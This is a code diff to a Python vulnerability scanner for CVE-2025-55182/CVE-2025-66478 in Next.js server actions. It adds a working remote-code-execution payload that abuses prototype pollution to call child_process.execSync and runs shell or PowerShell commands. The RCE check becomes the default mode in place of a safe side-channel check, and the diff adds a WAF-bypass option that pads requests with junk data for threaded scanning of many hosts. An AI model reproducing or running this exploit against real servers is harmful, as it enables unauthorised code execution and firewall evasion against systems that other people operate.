@@ -10,6 +10,9 @@ import argparse
 import sys
 import json
 import os
+import random
+import re
+import string
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
@@ -79,8 +82,15 @@ def normalize_host(host: str) -> str:
     return host.rstrip("/")
 
 
-def build_payload() -> tuple[str, str]:
-    """Build the multipart form data payload for the vulnerability check."""
+def generate_junk_data(size_bytes: int) -> tuple[str, str]:
+    """Generate random junk data for WAF bypass."""
+    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
+    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
+    return param_name, junk
+
+
+def build_safe_payload() -> tuple[str, str]:
+    """Build the safe multipart form data payload for the vulnerability check (side-channel)."""
     boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
 
     body = (
@@ -93,6 +103,63 @@ def build_payload() -> tuple[str, str]:
         f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
     )
 
+    content_type = f"multipart/form-data; boundary={boundary}"
+    return body, content_type
+
+
+def build_rce_payload(windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> tuple[str, str]:
+    """Build the RCE PoC multipart form data payload."""
+    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
+
+    if windows:
+        # PowerShell payload - escape double quotes for JSON
+        cmd = 'powershell -c \\\"41*271\\\"'
+    else:
+        # Linux/Unix payload
+        cmd = 'echo $((41*271))'
+
+    prefix_payload = (
+        f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
+        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
+        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
+    )
+
+    part0 = (
+        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
+        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
+        + prefix_payload
+        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
+    )
+
+    parts = []
+
+    # Add junk data at the start if WAF bypass is enabled
+    if waf_bypass:
+        param_name, junk = generate_junk_data(waf_bypass_size_kb * 1024)
+        parts.append(
+            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+            f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n'
+            f"{junk}\r\n"
+        )
+
+    parts.append(
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="0"\r\n\r\n'
+        f"{part0}\r\n"
+    )
+    parts.append(
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="1"\r\n\r\n'
+        f'"$@0"\r\n'
+    )
+    parts.append(
+        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
+        f'Content-Disposition: form-data; name="2"\r\n\r\n'
+        f"[]\r\n"
+    )
+    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")
+
+    body = "".join(parts)
     content_type = f"multipart/form-data; boundary={boundary}"
     return body, content_type
 
@@ -157,8 +224,8 @@ def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify
         return None, f"Unexpected error: {str(e)}"
 
 
-def is_vulnerable_response(response: requests.Response) -> bool:
-    """Check if a response indicates vulnerability."""
+def is_vulnerable_safe_check(response: requests.Response) -> bool:
+    """Check if a response indicates vulnerability (safe side-channel check)."""
     if response.status_code != 500 or 'E{"digest"' not in response.text:
         return False
 
@@ -174,7 +241,14 @@ def is_vulnerable_response(response: requests.Response) -> bool:
     return not is_mitigated
 
 
-def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None) -> dict:
+def is_vulnerable_rce_check(response: requests.Response) -> bool:
+    """Check if a response indicates vulnerability (RCE PoC check)."""
+    # Check for the X-Action-Redirect header with the expected value
+    redirect_header = response.headers.get("X-Action-Redirect", "")
+    return bool(re.search(r'.*/login\?a=11111.*', redirect_header))
+
+
+def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128) -> dict:
     """
     Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.
 
@@ -206,13 +280,17 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
 
     root_url = f"{host}/"
 
-    body, content_type = build_payload()
+    if safe_check:
+        body, content_type = build_safe_payload()
+        is_vulnerable = is_vulnerable_safe_check
+    else:
+        body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb)
+        is_vulnerable = is_vulnerable_rce_check
 
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 React2ShellScanner/1.0.0",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
         "Next-Action": "x",
         "X-Nextjs-Request-Id": "b5dce965",
-        "Next-Router-State-Tree": '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
         "Content-Type": content_type,
         "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
     }
@@ -223,7 +301,7 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
 
     def build_request_str(url: str) -> str:
         parsed = urlparse(url)
-        req_str = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
+        req_str = f"POST {'/aaa' or '/aaa'} HTTP/1.1\r\n"
         req_str += f"Host: {parsed.netloc}\r\n"
         for k, v in headers.items():
             req_str += f"{k}: {v}\r\n"
@@ -251,7 +329,7 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
     result["status_code"] = response.status_code
     result["response"] = build_response_str(response)
 
-    if is_vulnerable_response(response):
+    if is_vulnerable(response):
         result["vulnerable"] = True
         return result
 
@@ -273,7 +351,7 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
                 result["status_code"] = response.status_code
                 result["response"] = build_response_str(response)
 
-                if is_vulnerable_response(response):
+                if is_vulnerable(response):
                     result["vulnerable"] = True
                     return result
         except Exception:
@@ -428,6 +506,32 @@ Examples:
         help="Disable colored output"
     )
 
+    parser.add_argument(
+        "--safe-check",
+        action="store_true",
+        help="Use safe side-channel detection instead of RCE PoC"
+    )
+
+    parser.add_argument(
+        "--windows",
+        action="store_true",
+        help="Use Windows PowerShell payload instead of Unix shell"
+    )
+
+    parser.add_argument(
+        "--waf-bypass",
+        action="store_true",
+        help="Add junk data to bypass WAF content inspection (default: 128KB)"
+    )
+
+    parser.add_argument(
+        "--waf-bypass-size",
+        type=int,
+        default=128,
+        metavar="KB",
+        help="Size of junk data in KB for WAF bypass (default: 128)"
+    )
+
     args = parser.parse_args()
 
     if args.no_color or not sys.stdout.isatty():
@@ -453,10 +557,23 @@ Examples:
         print(colorize("[ERROR] No hosts to scan", Colors.RED))
         sys.exit(1)
 
+    # Adjust timeout for WAF bypass mode
+    timeout = args.timeout
+    if args.waf_bypass and args.timeout == 10:
+        timeout = 20
+
     if not args.quiet:
         print(colorize(f"[*] Loaded {len(hosts)} host(s) to scan", Colors.CYAN))
         print(colorize(f"[*] Using {args.threads} thread(s)", Colors.CYAN))
-        print(colorize(f"[*] Timeout: {args.timeout}s", Colors.CYAN))
+        print(colorize(f"[*] Timeout: {timeout}s", Colors.CYAN))
+        if args.safe_check:
+            print(colorize("[*] Using safe side-channel check", Colors.CYAN))
+        else:
+            print(colorize("[*] Using RCE PoC check", Colors.CYAN))
+        if args.windows:
+            print(colorize("[*] Windows mode enabled (PowerShell payload)", Colors.CYAN))
+        if args.waf_bypass:
+            print(colorize(f"[*] WAF bypass enabled ({args.waf_bypass_size}KB junk data)", Colors.CYAN))
         if args.insecure:
             print(colorize("[!] SSL verification disabled", Colors.YELLOW))
         print()
@@ -473,7 +590,7 @@ Examples:
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     if len(hosts) == 1:
-        result = check_vulnerability(hosts[0], args.timeout, verify_ssl, custom_headers=custom_headers)
+        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size)
         results.append(result)
         if not args.quiet or result["vulnerable"]:
             print_result(result, args.verbose)
@@ -482,7 +599,7 @@ Examples:
     else:
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
             futures = {
-                executor.submit(check_vulnerability, host, args.timeout, verify_ssl, custom_headers=custom_headers): host
+                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size): host
                 for host in hosts
             }
 
